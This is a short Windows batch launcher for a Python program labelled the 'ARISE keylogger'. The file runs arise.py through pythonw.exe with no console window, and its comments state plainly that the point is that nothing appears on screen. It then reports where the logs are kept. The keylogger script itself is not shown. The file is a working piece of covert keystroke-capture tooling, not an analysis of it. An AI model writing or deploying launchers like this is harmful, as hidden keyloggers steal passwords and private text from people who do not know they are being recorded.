@echo off
rem ============================================================
rem  ARISE keylogger - start hidden (no console window)
rem  Runs via pythonw.exe so nothing appears on screen.
rem ============================================================
where pythonw >nul 2>nul
if errorlevel 1 (
    echo [arise] pythonw.exe not found on PATH.
    pause
    exit /b 1
)
cd /d "%~dp0"
start "" /b pythonw "%~dp0arise.py"
echo [arise] started hidden. Logs: %~dp0logs
